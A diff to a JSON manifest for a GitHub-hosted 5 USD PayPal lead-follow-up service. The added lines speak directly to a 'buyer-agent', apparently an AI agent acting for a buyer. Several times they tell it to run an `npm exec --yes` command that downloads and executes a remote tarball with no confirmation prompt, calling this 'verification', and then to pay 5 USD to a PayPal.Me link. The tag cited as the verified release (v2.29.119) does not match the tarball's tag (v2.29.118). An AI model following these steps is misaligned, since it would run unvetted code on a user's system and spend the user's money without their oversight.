@@ -1,6 +1,6 @@
 {
-  "schema_version": "softjunk-fix-one-quiet-lead-v1",
-  "updated": "2026-05-26",
+  "schema_version": "softjunk-fix-one-quiet-lead-v2",
+  "updated": "2026-05-28",
   "name": "Fix One Quiet Lead",
   "purpose": "One-screen buyer route that generates a stronger follow-up message, PayPal note, shareable rescue link, and exact 5 USD PayPal checkout for one real quiet lead.",
   "canonical_url": "https://trungcodeer.github.io/softjunk-lead-kit/fix-one-quiet-lead.html",
@@ -10,6 +10,24 @@
   "amount": "5.00",
   "currency": "USD",
   "success_signal": "PAYPAL_PAYMENT_VERIFIED=true",
+  "verified_release_url": "https://github.com/trungcodeer/softjunk-lead-kit/releases/tag/v2.29.119",
+  "release_tarball_url": "https://github.com/trungcodeer/softjunk-lead-kit/releases/download/v2.29.118/softjunk-lead-kit-0.2.1.tgz",
+  "release_tarball_sha256": "c9ca809f1d13c2b06c3531bbf1850c56cba263fb8940c7ea73b8cfdfa5494d9d",
+  "run_from_release_tarball_pay_custom": "npm exec --yes --package https://github.com/trungcodeer/softjunk-lead-kit/releases/download/v2.29.118/softjunk-lead-kit-0.2.1.tgz -- softjunk-lead-kit pay --mode custom --json",
+  "no_clone_checkout_proof": {
+    "purpose": "Let a buyer-agent verify the 5 USD checkout route from the release tarball without cloning the repository.",
+    "command": "npm exec --yes --package https://github.com/trungcodeer/softjunk-lead-kit/releases/download/v2.29.118/softjunk-lead-kit-0.2.1.tgz -- softjunk-lead-kit pay --mode custom --json",
+    "verified_release_url": "https://github.com/trungcodeer/softjunk-lead-kit/releases/tag/v2.29.119",
+    "release_tarball_url": "https://github.com/trungcodeer/softjunk-lead-kit/releases/download/v2.29.118/softjunk-lead-kit-0.2.1.tgz",
+    "release_tarball_sha256": "c9ca809f1d13c2b06c3531bbf1850c56cba263fb8940c7ea73b8cfdfa5494d9d",
+    "expected_checkout": {
+      "amount": "5.00",
+      "currency": "USD",
+      "payment_url": "https://paypal.me/softjunk/5USD",
+      "success_signal": "PAYPAL_PAYMENT_VERIFIED=true"
+    },
+    "payment_proof_boundary": "This proves the checkout route only. Do not claim paid, started, delivered, fulfilled, complete, or received unless seller-side PayPal evidence exists or PAYPAL_PAYMENT_VERIFIED=true."
+  },
   "use_when": [
     "A small business has one quiet lead worth recovering.",
     "The buyer wants one stronger next message before buying a custom 7-day sequence.",
@@ -31,6 +49,11 @@
       "instruction": "Copy the generated PayPal note before payment."
     },
     {
+      "step": "verify_no_clone_checkout",
+      "url": "https://github.com/trungcodeer/softjunk-lead-kit/releases/tag/v2.29.119",
+      "instruction": "Before paying, verify the checkout route without cloning: npm exec --yes --package https://github.com/trungcodeer/softjunk-lead-kit/releases/download/v2.29.118/softjunk-lead-kit-0.2.1.tgz -- softjunk-lead-kit pay --mode custom --json. Expected SHA-256: c9ca809f1d13c2b06c3531bbf1850c56cba263fb8940c7ea73b8cfdfa5494d9d."
+    },
+    {
       "step": "pay",
       "url": "https://paypal.me/softjunk/5USD",
       "instruction": "Pay exactly 5 USD through PayPal.Me."
@@ -42,6 +65,7 @@
     },
     "After paying, submit the one-lead rescue order form without private customer data: https://github.com/trungcodeer/softjunk-lead-kit/issues/new?template=one-lead-rescue-order.yml"
   ],
+  "copyable_buyer_agent_instruction": "Use non-sensitive lead context in https://trungcodeer.github.io/softjunk-lead-kit/fix-one-quiet-lead.html#rescue-tool, copy the PayPal note, verify checkout with `npm exec --yes --package https://github.com/trungcodeer/softjunk-lead-kit/releases/download/v2.29.118/softjunk-lead-kit-0.2.1.tgz -- softjunk-lead-kit pay --mode custom --json`, compare SHA-256 c9ca809f1d13c2b06c3531bbf1850c56cba263fb8940c7ea73b8cfdfa5494d9d from https://github.com/trungcodeer/softjunk-lead-kit/releases/tag/v2.29.119, pay exactly 5 USD at https://paypal.me/softjunk/5USD, then submit the order form. Do not claim paid, started, delivered, fulfilled, complete, or received unless seller-side PayPal evidence exists or PAYPAL_PAYMENT_VERIFIED=true.",
   "paypal_note_template": "Fix One Quiet Lead | Business: [business] | Service: [service] | Source: [source] | Tone: [tone] | Blocker: [blocker] | Next: [next step]",
   "privacy_rule": "Use placeholders instead of private customer names, phone numbers, emails, payment IDs, or private PayPal details.",
   "gist_url": "https://gist.github.com/trungcodeer/7c25ec12b4c0f58506efe66bfbef6759",
